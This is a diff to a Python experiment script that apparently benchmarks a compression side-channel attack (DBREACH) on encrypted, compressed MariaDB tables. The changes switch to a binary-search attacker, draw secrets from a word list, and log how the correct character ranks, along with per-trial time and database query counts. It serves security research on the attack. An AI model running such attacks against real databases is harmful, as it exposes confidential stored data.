@@ -1,7 +1,8 @@
 import utils.mariadb_utils as utils
 import dbreacher
+import dbreacher_impl_binary_search
 import dbreacher_impl
-import k_of_n_attacker
+import k_of_n_attacker_binary
 import random
 import string
 import statistics
@@ -37,20 +38,23 @@ for prefix_len in range(1, 21):
         prefix_len_to_poses_new[prefix_len][i] = []
 
 print("prefix_length,amplification_rounds,scoring_system,is_in_first,ranking,points_behind_first,points_ahead_next_char,points_between_first_and_second,time_for_current_round")
-for trial in range(100):
+for trial in range(0, 50):
+    startTime = time.time()
     print("STARTING TRIAL " + str(trial))
-    for prefix_len in [1, 2, 3, 5, 10, 15, 20]:
-        #print("prefix len = " + str(prefix_len))
-        known_prefix = ''.join(random.choices(string.ascii_lowercase, k=prefix_len)) 
+    for prefix_len in [15]: 
 
         possibilities = []
-        for c in string.ascii_lowercase:
-            possibilities.append(known_prefix + c)
+
+        with open("/home/britney/dbreach-britney/resources/char-by-char.txt") as f:
+            for line in f:
+                word = line.strip().lower()
+                possibilities.append(word)
+        
+        known_prefix = possibilities[trial][:prefix_len]
 
         num_secrets = 1
-        secret = random.choice(possibilities)
+        secret = possibilities[trial]
         correct_char = secret[-1]
-        #print(secret + "; " + correct_char)
 
         scores = dict()
         scores_new = dict()
@@ -66,11 +70,12 @@ for trial in range(100):
                 compressed=True,
                 encrypted=True)
         control.insert_row(table, 0, secret)
-        dbreacher = dbreacher_impl.DBREACHerImpl(control, table, num_secrets, maxRowSize, string.printable.replace(string.ascii_lowercase, '').replace('*', ''), ord('*'))
-
-        attacker = k_of_n_attacker.kOfNAttacker(len(string.ascii_lowercase), dbreacher, possibilities, True)
+        dbreacher = dbreacher_impl_binary_search.DBREACHerImpl(control, table, num_secrets, maxRowSize, string.printable.replace(string.ascii_lowercase, '').replace('*', ''), ord('*'))
+    
+        attacker = k_of_n_attacker_binary.kOfNAttacker(len(string.ascii_lowercase), dbreacher, possibilities, True)
         points_between_first_and_second = 0
         while i < 40 or (points_between_first_and_second < 35 and i < 100):
+            print("AMPLIFICIATION ROUND: " + str(i))
             '''
             control.drop_table(table)
             time.sleep(1)
@@ -129,13 +134,13 @@ for trial in range(100):
                         position = statistics.mean([place + 1 + i for i in range(len(scores_to_chars[key]))])
                         place = position
                         points_behind = key - keys[0]
-                        points_ahead = 0
                         if idx < len(keys) - 1 and len(scores_to_chars[key]) == 1:
                             points_ahead = keys[idx + 1] - key
                         prefix_len_to_poses[prefix_len][i].append((position, points_behind, points_ahead))
                         break
                 if len(keys) > 1:
                     points_between_first_and_second = keys[1] - keys[0]
+                print("PLACE: " + str(place))
                 print(str(prefix_len) + ","+str(i)+",0,"+str(1 if place == 1 else 0)+","+str(place)+","+str(points_behind)+","+str(points_ahead)+","+str(points_between_first_and_second)+","+str(end - start))
                 '''
                 leaderboard_new = [(b, c) for (c, b) in scores_new.items()]
@@ -167,20 +172,8 @@ for trial in range(100):
                         break
                 print(str(prefix_len) + ","+str(i)+",1,"+str(1 if place == 1 else 0)+","+str(place)+","+str(points_behind)+","+str(points_ahead)) 
                 '''
-                #print(normalized)
-                #print(leaderboard)
-
-
-                #if normalized[-1][0] > 50:
-                #    time.sleep(10)
 
                 i += 1
-
-        #print(prefix_len_to_poses)
-        #print("")
-        #print(prefix_len_to_poses_new)
-
-
-
-        
-        
+    endTime = time.time()
+    print("TOTAL TRIAL TIME: " + str(endTime-startTime))
+    print("NUMBER OF DB QUERIES: " + str(attacker.dbreacher.db_count))
